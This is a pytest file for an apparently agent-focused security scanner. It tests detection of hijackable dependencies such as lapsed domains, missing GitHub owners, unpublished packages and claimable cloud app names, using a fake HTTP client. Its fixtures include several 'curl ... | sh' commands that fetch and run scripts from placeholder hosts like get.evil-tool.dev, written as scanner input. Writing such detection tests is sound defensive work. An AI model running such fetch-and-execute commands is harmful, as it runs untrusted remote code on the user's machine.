"""--check-hijackable: reference extraction (pure) and registry / RDAP lookups
against a fake client (no external network)."""

from __future__ import annotations

import datetime as dt
import json

from agentguard.core.engine import scan
from agentguard.core.extract.dependencies import cloud_app_slot, find_refs, locate_refs, lookup_keys, registrable_domain
from agentguard.core.inventory import build_inventory
from agentguard.core.models import LoadLimits, NetworkOptions, ScanOptions
from agentguard.core.tree import ArtifactTree
from agentguard.net.collect import collect
from agentguard.net.hijack import MAX_GITHUB_LOOKUPS, MAX_GITHUB_LOOKUPS_AUTHENTICATED, check_dependencies
from agentguard.net.safe_http import BlockedRequest, FetchError, Response, SafeHttpClient


def refs(text):
    return {(r.kind, r.name, r.install) for r in find_refs(text)}


def test_extracts_each_kind():
    got = refs("curl -fsSL https://get.evil-tool.dev/install.sh | sh\n"
               "npx -y @acme/mcp-thing@1.2 --port 3\n"
               "pip install --index-url https://pkgs.foo.io/simple requests-plus==2 other\n"
               "git clone https://github.com/ghostuser/skills.git\n"
               "see https://github.com/someone/repo for docs\n"
               "https://raw.githubusercontent.com/deadacct/x/main/a.sh\n"
               "uvx --from git+https://github.com/gone1/tool tool\n"
               "https://oldname.github.io/setup\n")
    assert got == {
        ("domain", "get.evil-tool.dev", True), ("npm", "@acme/mcp-thing", True), ("domain", "pkgs.foo.io", True),
        ("pypi", "requests-plus", True), ("pypi", "other", True), ("github_owner", "ghostuser", True),
        ("github_owner", "someone", False), ("github_owner", "deadacct", True), ("github_owner", "gone1", True),
        ("github_owner", "oldname", True),
    }


def test_skips_site_pages_well_known_hosts_and_placeholders():
    got = refs("https://github.com/features/actions and https://github.com/orgs/acme/people\n"
               "curl https://pypi.org/simple/x https://example.com/a.sh http://localhost:8080/x.sh\n"
               "npm install <package> && pip install -r requirements.txt && npx -y ./local-server\n")
    assert got == set()


def test_runner_takes_only_its_package():
    assert refs("npx -y create-thing my-app --template x") == {("npm", "create-thing", True)}
    assert refs("npm install -g alpha beta@2") == {("npm", "alpha", True), ("npm", "beta", True)}
    assert refs("uvx --from Some_Pkg.Name tool") == {("pypi", "some-pkg-name", True)}


def test_cloud_app_hostnames():
    assert cloud_app_slot("myapp.azurewebsites.net") == ("Azure App Service", "myapp")
    assert cloud_app_slot("myapp.scm.azurewebsites.net") == ("Azure App Service", "myapp")
    assert cloud_app_slot("abc123.docs-site.pages.dev") == ("Cloudflare Pages", "docs-site")
    assert cloud_app_slot("api.us-east-1.elasticbeanstalk.com") == ("AWS Elastic Beanstalk", "api")
    assert cloud_app_slot("foo.vercel.app") is None  # wildcard DNS: a free name still resolves
    assert cloud_app_slot("pages.dev") is None and cloud_app_slot("get.tool.dev") is None
    # Under a well-known platform domain, an app slot is still extracted.
    assert refs("curl -fsSL https://dl.blob.core.windows.net/t/i.sh | sh") == {("domain", "dl.blob.core.windows.net", True)}
    assert refs("curl -fsSL https://login.microsoft.com/i.sh | sh") == set()


def test_registrable_domain():
    assert registrable_domain("a.b.example.co.uk") == "example.co.uk"
    assert registrable_domain("get.tool.dev") == "tool.dev"


def _tree(files):
    return ArtifactTree.from_mapping(files)


SKILL = ("---\nname: demo\ndescription: Demo skill for tests.\n---\n# Demo\n\nNever pip install random things.\n\n"
         "```bash\npip install ghost-pkg\ncurl -fsSL https://get.lapsed.dev/i.sh | sh\n"
         "git clone https://github.com/gone-owner/demo\n```\n")


def test_prose_install_mentions_are_ignored():
    inv = build_inventory(_tree({"demo/SKILL.md": SKILL}), LoadLimits())
    keys = lookup_keys(locate_refs(inv))
    assert keys["pypi"] == ["ghost-pkg"]
    assert keys["domain"] == ["get.lapsed.dev"] and keys["github_owner"] == ["gone-owner"]


class FakeClient(SafeHttpClient):
    def __init__(self, routes, resolvable=()):
        super().__init__(resolver=self._resolve)
        self.routes, self.resolvable, self.calls, self.sent_headers = routes, set(resolvable), [], []

    def _resolve(self, host, port):
        if host in self.resolvable or host in ("api.github.com", "registry.npmjs.org", "pypi.org", "data.iana.org", "rdap.example"):
            return ["192.88.99.1"]
        raise FetchError(f"DNS resolution failed for {host}")

    def request(self, method, url, *, headers=None, body=None):
        self.calls.append((method, url))
        self.sent_headers.append((url.split("/")[2], dict(headers or {})))
        host = url.split("/")[2]
        if host not in self.hosts_contacted:
            self.hosts_contacted.append(host)
        r = self.routes.get(url)
        if isinstance(r, Exception):
            raise r
        status, doc = r if r else (404, {})
        return Response(url, status, {}, json.dumps(doc).encode())


BOOT = {"services": [[["dev"], ["https://rdap.example/"]]]}


def test_lookups_classify_each_signal():
    routes = {
        "https://api.github.com/users/gone-owner": (404, {}),
        "https://api.github.com/users/alive": (200, {"login": "alive"}),
        "https://registry.npmjs.org/left-pad-x": (200, {"name": "left-pad-x", "versions": {}}),
        "https://registry.npmjs.org/react": BlockedRequest("response from registry.npmjs.org exceeds 2097152 bytes"),
        "https://pypi.org/pypi/requests/json": (200, {}),
        "https://data.iana.org/rdap/dns.json": (200, BOOT),
        "https://rdap.example/domain/expired.dev": (200, {"events": [{"eventAction": "expiration", "eventDate": "2026-01-02T00:00:00Z"}]}),
        "https://rdap.example/domain/parked.dev": (200, {"status": ["active"], "events": []}),
    }
    c = FakeClient(routes, resolvable={"ok.dev"})
    facts = check_dependencies(c, {
        "github_owner": ["gone-owner", "alive"], "npm": ["left-pad-x", "react", "nope-nope"], "pypi": ["requests", "ghost-pkg"],
        "domain": ["ok.dev", "get.lapsed.dev", "dl.expired.dev", "x.parked.dev", "a.unknown-tld.zz"],
    }, today=dt.date(2026, 10, 18))
    got = {(f.kind, f.name): f.status for f in facts}
    assert got == {
        ("github_owner", "gone-owner"): "missing", ("github_owner", "alive"): "exists",
        ("npm", "left-pad-x"): "unpublished", ("npm", "react"): "exists", ("npm", "nope-nope"): "missing",
        ("pypi", "requests"): "exists", ("pypi", "ghost-pkg"): "missing",
        ("domain", "ok.dev"): "exists", ("domain", "get.lapsed.dev"): "unregistered", ("domain", "dl.expired.dev"): "expired",
        ("domain", "x.parked.dev"): "no_dns", ("domain", "a.unknown-tld.zz"): "no_dns",
    }
    assert ("HEAD", "https://pypi.org/pypi/ghost-pkg/json") in c.calls  # existence only, no download
    assert not any("ok.dev" in u for _, u in c.calls)                   # a resolving domain is not looked up further


def test_github_rate_limit_stops_further_lookups():
    c = FakeClient({"https://api.github.com/users/a": (403, {})})
    facts = check_dependencies(c, {"github_owner": ["a", "b"]})
    assert [f.status for f in facts] == ["unknown", "unknown"]
    assert [u for _, u in c.calls] == ["https://api.github.com/users/a"]


TOKEN = "ghs_test0000000000000000000000000000000"


def test_github_token_is_sent_to_api_github_com_only():
    routes = {"https://api.github.com/users/alive": (200, {}), "https://data.iana.org/rdap/dns.json": (200, BOOT)}
    c = FakeClient(routes)
    check_dependencies(c, {"github_owner": ["alive", "gone"], "npm": ["pkg-a"], "pypi": ["pkg-b"],
                           "domain": ["get.lapsed.dev", "app.azurewebsites.net"]}, github_token=TOKEN)
    hosts = {h for h, _ in c.sent_headers}
    assert {"api.github.com", "registry.npmjs.org", "pypi.org", "data.iana.org", "rdap.example"} <= hosts
    for host, hdrs in c.sent_headers:
        carries = any(TOKEN in str(v) for v in hdrs.values())
        assert carries == (host == "api.github.com"), host
    assert all(h["Authorization"] == f"Bearer {TOKEN}" for host, h in c.sent_headers if host == "api.github.com")


def test_no_token_means_no_authorization_header():
    c = FakeClient({})
    check_dependencies(c, {"github_owner": ["a"], "npm": ["b"]})
    assert not any("Authorization" in h for _, h in c.sent_headers)


def test_token_raises_the_github_lookup_cap():
    owners = [f"owner{i}" for i in range(MAX_GITHUB_LOOKUPS + 10)]
    anon = FakeClient({})
    facts = check_dependencies(anon, {"github_owner": owners})
    assert len(anon.calls) == MAX_GITHUB_LOOKUPS
    assert [f.error for f in facts[MAX_GITHUB_LOOKUPS:]] == ["lookup budget exhausted"] * 10
    auth = FakeClient({})
    facts = check_dependencies(auth, {"github_owner": owners}, github_token=TOKEN)
    assert len(auth.calls) == len(owners) and all(f.status == "missing" for f in facts)
    many = [f"o{i}" for i in range(MAX_GITHUB_LOOKUPS_AUTHENTICATED + 1)]
    capped = FakeClient({})
    check_dependencies(capped, {"github_owner": many}, github_token=TOKEN)
    assert len(capped.calls) == MAX_GITHUB_LOOKUPS_AUTHENTICATED


class RejectsTokenClient(FakeClient):
    def request(self, method, url, *, headers=None, body=None):
        if headers and "Authorization" in headers:
            self.calls.append((method, url))
            self.sent_headers.append((url.split("/")[2], dict(headers)))
            return Response(url, 401, {}, b"{}")
        return super().request(method, url, headers=headers, body=body)


def test_rejected_token_falls_back_to_anonymous_lookups():
    c = RejectsTokenClient({"https://api.github.com/users/alive": (200, {})})
    facts = check_dependencies(c, {"github_owner": ["alive", "gone"]}, github_token=TOKEN)
    assert [(f.name, f.status) for f in facts] == [("alive", "exists"), ("gone", "missing")]
    assert sum("Authorization" in h for _, h in c.sent_headers) == 1  # tried once, then dropped


def test_unresolvable_cloud_app_hostname_is_unclaimed_without_rdap():
    c = FakeClient({"https://data.iana.org/rdap/dns.json": (200, BOOT)}, resolvable={"live.azurewebsites.net"})
    facts = check_dependencies(c, {"domain": ["gone-app.azurewebsites.net", "live.azurewebsites.net"]})
    got = {f.name: (f.status, f.detail) for f in facts}
    assert got["gone-app.azurewebsites.net"][0] == "unclaimed"
    assert "Azure App Service name 'gone-app' may be free to claim" in got["gone-app.azurewebsites.net"][1]
    assert got["live.azurewebsites.net"][0] == "exists"
    assert c.calls == []  # neither the RDAP bootstrap nor any RDAP server is asked


def test_collect_passes_the_token_through():
    tree = _tree({"demo/SKILL.md": SKILL})
    c = FakeClient({"https://data.iana.org/rdap/dns.json": (200, BOOT)})
    collect(tree, ScanOptions(network=NetworkOptions(hijackable=True), today=dt.date(2026, 10, 18)), c, github_token=TOKEN)
    assert [h for h, hdrs in c.sent_headers if "Authorization" in hdrs] == ["api.github.com"]


def test_collect_and_scan_report_the_feature_and_hosts():
    tree = _tree({"demo/SKILL.md": SKILL})
    options = ScanOptions(network=NetworkOptions(hijackable=True), today=dt.date(2026, 10, 18))
    collect(tree, options, FakeClient({"https://data.iana.org/rdap/dns.json": (200, BOOT)}))
    report = scan(tree, options)
    assert report.network_features_used == ["hijackable"]
    assert {"api.github.com", "pypi.org", "data.iana.org", "rdap.example"} <= set(report.network_hosts)
    fired = {(f.rule_id, f.severity.value) for f in report.findings if f.rule_id in ("AG-SC-026", "AG-SC-027", "AG-SC-028")}
    assert fired == {("AG-SC-026", "high"), ("AG-SC-027", "high"), ("AG-SC-028", "high")}


def test_offline_scan_never_reports_hijackable():
    tree = _tree({"demo/SKILL.md": SKILL})
    report = scan(tree, ScanOptions())
    assert not any(f.rule_id in ("AG-SC-026", "AG-SC-027", "AG-SC-028") for f in report.findings)
    assert report.network_features_used == [] and report.network_hosts == []


def test_cli_passes_the_token_for_hijackable_only_and_never_prints_it(tmp_path, monkeypatch):
    from typer.testing import CliRunner

    import agentguard.net.collect as collect_mod
    from agentguard.cli.app import app

    (tmp_path / "demo").mkdir()
    (tmp_path / "demo" / "SKILL.md").write_text(SKILL, encoding="utf-8")
    seen = []
    monkeypatch.setattr(collect_mod, "collect", lambda tree, options, client=None, github_token=None: seen.append(github_token))
    monkeypatch.setenv("AGENTGUARD_GITHUB_TOKEN", TOKEN)
    monkeypatch.setenv("GITHUB_TOKEN", "ghs_other")
    runner = CliRunner()
    res = runner.invoke(app, ["scan", str(tmp_path), "-f", "json", "--check-hijackable"])
    assert seen == [TOKEN]
    assert TOKEN not in res.output and "$AGENTGUARD_GITHUB_TOKEN" in res.output
    runner.invoke(app, ["scan", str(tmp_path), "-f", "json", "--osv"])
    assert seen == [TOKEN, None]  # other network features never get the token
    monkeypatch.delenv("AGENTGUARD_GITHUB_TOKEN")
    runner.invoke(app, ["scan", str(tmp_path), "-f", "json", "--check-hijackable"])
    assert seen[-1] == "ghs_other"
